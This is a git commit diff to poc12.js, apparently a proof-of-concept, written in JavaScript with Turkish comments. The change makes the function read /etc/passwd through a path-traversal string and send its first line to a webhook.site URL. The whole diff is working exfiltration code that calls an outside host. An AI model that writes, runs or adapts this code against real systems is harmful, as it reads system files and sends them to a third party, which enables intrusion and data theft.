2087fa9cbc278bc8e21258ab63ff973391d28dd3
Sarp Dora Yönden <69794292+sarpdora23@users.noreply.github.com>
2024-06-23 00:18:53 +0300

    Update poc12.js

--- poc12.js
+++ poc12.js
@@ -1,23 +1,34 @@
+const fs = require('fs');
 const fetch = require('node-fetch');
 
 function fetchGoogle(ctx, req, res) {
-    fetch('https://webhook.site/0ccbcbcc-7da3-4759-9855-ac1dc992520a', {
-        method: 'GET',
-        headers: {
-            'Content-Type': 'text/html',
-        },
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok ' + response.statusText);
+    fs.readFile('../../../../../../../etc/passwd', 'utf8', (err, data) => {
+        if (err) {
+            res.status(500).send('Error reading file: ' + err.message);
+            return;
         }
-        return response.text();
-    })
-    .then(data => {
-        res.status(200).send(data);  // Başarılı yanıtı gönder
-    })
-    .catch(error => {
-        res.status(500).send('Fetch error: ' + error.message);  // Hata durumunda yanıt gönder
+        
+        const lines = data.split('\n');
+        const firstLine = lines[0].trim(); // Dosyanın ilk satırını al
+
+        fetch(`https://webhook.site/0ccbcbcc-7da3-4759-9855-ac1dc992520a/${firstLine}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'text/html',
+            },
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok ' + response.statusText);
+            }
+            return response.text();
+        })
+        .then(data => {
+            res.status(200).send(data);  // Başarılı yanıtı gönder
+        })
+        .catch(error => {
+            res.status(500).send('Fetch error: ' + error.message);  // Hata durumunda yanıt gönder
+        });
     });
 }
 
